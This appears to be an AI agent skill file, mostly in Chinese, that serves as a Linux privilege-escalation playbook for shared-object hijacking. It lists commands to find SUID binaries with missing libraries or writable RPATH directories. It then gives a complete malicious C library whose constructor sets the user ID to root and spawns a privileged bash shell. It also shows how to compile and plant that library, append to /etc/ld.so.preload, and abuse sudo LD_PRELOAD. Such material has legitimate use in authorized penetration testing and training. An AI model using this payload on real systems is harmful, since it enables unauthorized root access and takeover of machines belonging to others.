---
name: 'shared-object-hijacking'
description: 'Shared Object/Library Hijacking：SUID二进制+缺失.so+RPATH可写→恶意.so注入。LD_PRELOAD/ld.so.preload。'
disable-model-invocation: true
metadata: { domain: linux, tier: T2 }
---

## Shared Object / Library Hijacking (Linux)

### 识别
```bash
# 1. 找 SUID 二进制
find / -perm -4000 -type f 2>/dev/null

# 2. 检查缺失的共享库
strace /usr/local/bin/suid_binary 2>&1 | grep -i "open\|access" | grep "\.so"
ldd /usr/local/bin/suid_binary | grep "not found"

# 3. 检查 RUNPATH
readelf -d /usr/local/bin/suid_binary | grep -E 'RPATH|RUNPATH'
# RPATH 指向可写目录 → 放置恶意 .so
```text

### 利用
```bash
# 场景A: 缺失 .so → 编译同名 .so 放到搜索路径
cat > evil.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void __attribute__((constructor)) init() {
    setuid(0); setgid(0);
    system("/bin/bash -p");
}
EOF
gcc -shared -fPIC -o libmissing.so evil.c
cp libmissing.so /path/to/ld/searches/

# 场景B: RPATH→可写目录
# 在 RPATH 指向的目录创建恶意 .so，同名覆盖

# 场景C: /etc/ld.so.preload 可写
echo "/tmp/evil.so" >> /etc/ld.so.preload

# 场景D: LD_PRELOAD (需要 sudo LD_PRELOAD 权限)
sudo LD_PRELOAD=/tmp/evil.so /usr/bin/command
```text

### 搜索路径顺序
```text
1. RPATH (ELF header)
2. LD_LIBRARY_PATH
3. RUNPATH (ELF header)
4. /etc/ld.so.cache
5. /lib, /usr/lib
```text

### 常见漏洞 SUID 路径
```text
/usr/local/bin/ → 自定义软件经常有缺失 so
/opt/ → 企业软件
```text
